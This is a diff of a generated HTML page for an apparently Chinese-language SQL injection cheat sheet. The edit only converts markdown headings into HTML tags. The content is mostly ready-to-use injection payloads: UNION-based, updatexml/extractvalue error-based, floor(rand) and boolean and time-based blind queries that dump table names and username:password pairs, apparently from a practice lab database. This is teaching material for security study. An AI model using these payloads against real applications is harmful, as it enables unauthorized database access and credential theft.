@@ -82,9 +82,7 @@ regexp、like语句</code></pre><h2 id="UNION-SELECT"><a href="#UNION-SELECT" cl
 <pre><code>id=-1&apos; and union select 1,2,group_concat(schema_name) from information_schema.schemata --+</code></pre><p><em>查询表名：</em></p>
 <pre><code>id=-1&apos; and union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</code></pre><p><em>查询列名：</em></p>
 <pre><code>id=-1&apos; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos; --+</code></pre><p><em>查询字段值：</em></p>
-<pre><code>id=-1&apos; union select 1,2,group_concat(id,username,password) from users--+</code></pre><p>##基于报错注入</p>
-<p>###updatexml报错注入</p>
-<p><strong>updatexml(XML_document,XPath_String,new_value)</strong></p>
+<pre><code>id=-1&apos; union select 1,2,group_concat(id,username,password) from users--+</code></pre><h2 id="基于报错注入"><a href="#基于报错注入" class="headerlink" title="基于报错注入"></a>基于报错注入</h2><h3 id="updatexml报错注入"><a href="#updatexml报错注入" class="headerlink" title="updatexml报错注入"></a>updatexml报错注入</h3><p><strong>updatexml(XML_document,XPath_String,new_value)</strong></p>
 <p><em>获取数据库名、版本信息：</em></p>
 <pre><code>id=1&apos; and updatexml(1,concat(0x23,database(),0x23,version(),0x23),1)--+</code></pre><p><em>获取表名：</em></p>
 <pre><code>id=1&apos; and updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x23),1)--+</code></pre><p><em>获取列名：</em></p>
@@ -98,15 +96,12 @@ id=1&apos; union select 1 from (select count(*),concat(0x23,database(),0x23,floo
 id=1&apos; union select 1,2,count(*) from information_schema.columns group by concat(version(),floor(rand(0)*2)) --+</code></pre><p><em>爆表：</em></p>
 <pre><code>id=1&apos; and (select 1 from (select count(*),concat(0x23,(select concat(table_name) from information_schema.tables where table_schema=database() limit 3,1),0x23,floor(rand(0)*2)) as x from information_schema.tables group by y) as a) --+</code></pre><p><em>爆列名：</em></p>
 <pre><code>id=1&apos; and (select 1 from (select count(*),concat(0x23,(select concat(column_name) from information_schema.columns where table_name=&apos;users&apos; limit 5,1),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as a)--+</code></pre><p><em>爆字段值:</em></p>
-<pre><code>id=1&apos; and (select 1 from (select count(*),concat(0x23,(select concat(username,&apos;:&apos;,password) from security.users limit 0,1),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as a)--+</code></pre><p>###extractvalue报错注入</p>
-<p><strong>extractvalue(xml_frag, xpath_expr)</strong></p>
+<pre><code>id=1&apos; and (select 1 from (select count(*),concat(0x23,(select concat(username,&apos;:&apos;,password) from security.users limit 0,1),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as a)--+</code></pre><h3 id="extractvalue报错注入"><a href="#extractvalue报错注入" class="headerlink" title="extractvalue报错注入"></a>extractvalue报错注入</h3><p><strong>extractvalue(xml_frag, xpath_expr)</strong></p>
 <p><em>爆库：</em></p>
 <pre><code>id=1&apos; and extractvalue(1,concat_ws(0x23,user(),version(),database(),@@version_compile_os))--+</code></pre><p><em>爆表：</em></p>
 <pre><code>id=1&apos; and extractvalue(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+</code></pre><p><em>爆列名:</em></p>
 <pre><code>id=1&apos; and extractvalue(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;)))--+</code></pre><p><em>爆字段：</em></p>
-<pre><code>id=1&apos; and extractvalue(1,(select group_concat(username,&apos;:&apos;,password) from users))--+</code></pre><p>##盲注</p>
-<p>###基于布尔的盲注</p>
-<pre><code>ascii()返回指定字符串最左侧字符的ascii值
+<pre><code>id=1&apos; and extractvalue(1,(select group_concat(username,&apos;:&apos;,password) from users))--+</code></pre><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="基于布尔的盲注"><a href="#基于布尔的盲注" class="headerlink" title="基于布尔的盲注"></a>基于布尔的盲注</h3><pre><code>ascii()返回指定字符串最左侧字符的ascii值
 count()计算结果集的数量
 length()返回指定字符串的长度
 substr(str,pos,len)
@@ -137,8 +132,7 @@ id=1&apos; and length((select column_name from information_schema.columns where 
 <pre><code>id=1&apos; and (select count(username) from security.users)=13 --+</code></pre><p><em>猜字段长度</em></p>
 <pre><code>id=1&apos; and length((select username from security.users limit 0,1))=4 --+</code></pre><p><em>dump字段的值</em></p>
 <pre><code>id=1&apos; and ascii(substr((select username from security.users limit 0,1),1,1))=67--+
-id=1&apos; and ascii(substr((select concat(username,&apos;:&apos;,password) from security.users limit 0,1),1,1))=68--+</code></pre><p>###基于时间的盲注</p>
-<p><em>在获取表名、列名以及具体信息时，方法与布尔盲注相同，都是逐个猜解</em></p>
+id=1&apos; and ascii(substr((select concat(username,&apos;:&apos;,password) from security.users limit 0,1),1,1))=68--+</code></pre><h3 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h3><p><em>在获取表名、列名以及具体信息时，方法与布尔盲注相同，都是逐个猜解</em></p>
 <pre><code>if(1,2,3)：如果1为True，则执行2，否则执行3
 sleep(x)：执行延迟x秒
 ascii(char)：将char转换为对应的ascii码
